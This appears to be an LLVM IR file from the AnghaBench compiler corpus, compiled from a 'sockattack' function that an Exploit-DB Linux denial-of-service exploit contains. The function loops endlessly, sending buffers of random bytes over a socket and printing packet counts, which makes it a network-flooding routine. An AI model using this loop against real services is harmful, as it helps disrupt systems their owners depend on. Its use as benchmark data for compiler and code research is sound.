; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_22624.c_sockattack.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_22624.c_sockattack.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [35 x i8] c"\0D -- %ld packets / %ld bytes sent \00", align 1
@stdout = common dso_local global i32 0, align 4
@sockfd = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c"\0A -- send() failed, reconnecting ..\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @sockattack() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = load i32, i32* @BUFSIZE, align 4
  %6 = zext i32 %5 to i64
  %7 = call i8* @llvm.stacksave()
  store i8* %7, i8** %1, align 8
  %8 = alloca i8, i64 %6, align 16
  store i64 %6, i64* %2, align 8
  store i64 0, i64* %3, align 8
  br label %9

9:                                                ; preds = %43, %0
  br label %10

10:                                               ; preds = %9
  %11 = load i32, i32* @TIMEOUT, align 4
  %12 = call i32 @alarm(i32 %11)
  store i32 0, i32* %4, align 4
  br label %13

13:                                               ; preds = %24, %10
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = icmp ult i64 %15, %6
  br i1 %16, label %17, label %27

17:                                               ; preds = %13
  %18 = call i32 (...) @rand()
  %19 = srem i32 %18, 256
  %20 = trunc i32 %19 to i8
  %21 = load i32, i32* %4, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds i8, i8* %8, i64 %22
  store i8 %20, i8* %23, align 1
  br label %24

24:                                               ; preds = %17
  %25 = load i32, i32* %4, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %4, align 4
  br label %13

27:                                               ; preds = %13
  %28 = load i64, i64* %3, align 8
  %29 = add i64 %28, 1
  store i64 %29, i64* %3, align 8
  %30 = load i64, i64* %3, align 8
  %31 = load i64, i64* %3, align 8
  %32 = mul i64 %31, %6
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i64 %30, i64 %32)
  %34 = load i32, i32* @stdout, align 4
  %35 = call i32 @fflush(i32 %34)
  %36 = load i32, i32* @sockfd, align 4
  %37 = trunc i64 %6 to i32
  %38 = call i32 @send(i32 %36, i8* %8, i32 %37, i32 0)
  %39 = sext i32 %38 to i64
  %40 = icmp ne i64 %39, %6
  br i1 %40, label %41, label %43

41:                                               ; preds = %27
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  br label %44

43:                                               ; preds = %27
  br label %9

44:                                               ; preds = %41
  %45 = load i8*, i8** %1, align 8
  call void @llvm.stackrestore(i8* %45)
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @alarm(i32) #2

declare dso_local i32 @rand(...) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
